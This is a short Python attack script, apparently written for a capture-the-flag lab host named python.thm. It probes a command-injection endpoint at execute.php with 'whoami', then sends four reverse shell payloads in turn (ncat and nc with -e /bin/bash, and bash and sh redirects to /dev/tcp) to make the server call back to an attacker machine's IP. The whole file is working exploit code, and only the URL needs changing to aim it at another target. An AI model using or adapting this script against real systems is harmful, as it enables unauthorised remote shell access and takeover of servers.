import requests
import urllib.parse

TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="
ATTACKBOX_IP = "10.8.95.106"  # Double-check this is your tun0 IP
PORT = "80"  # Try 443 if 4444 fails

# Test command injection
test_payload = "whoami"
print("[+] Testing command injection with 'whoami'...")
encoded_test = urllib.parse.quote(test_payload)
response = requests.get(TARGET_URL + encoded_test, timeout=10)
print(f"[+] Server response: {response.text}")

# Reverse shell payloads
payloads = [
    f"ncat {ATTACKBOX_IP} {PORT} -e /bin/bash",
    f"bash -i >& /dev/tcp/{ATTACKBOX_IP}/{PORT} 0>&1",
    f"nc -e /bin/bash {ATTACKBOX_IP} {PORT}",
    f"/bin/sh -i >& /dev/tcp/{ATTACKBOX_IP}/{PORT} 0>&1"
]

print("[+] Testing reverse shell payloads...")
for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    print(f"[+] Trying payload: {payload}")
    try:
        response = requests.get(TARGET_URL + encoded_payload, timeout=10)
        print(f"[+] Server response: {response.text}")
    except requests.RequestException as e:
        print(f"[-] Error with payload '{payload}': {e}")
    print("[*] Check your nc listener for a shell...")
    input("[*] Press Enter to try next payload or Ctrl+C to stop...")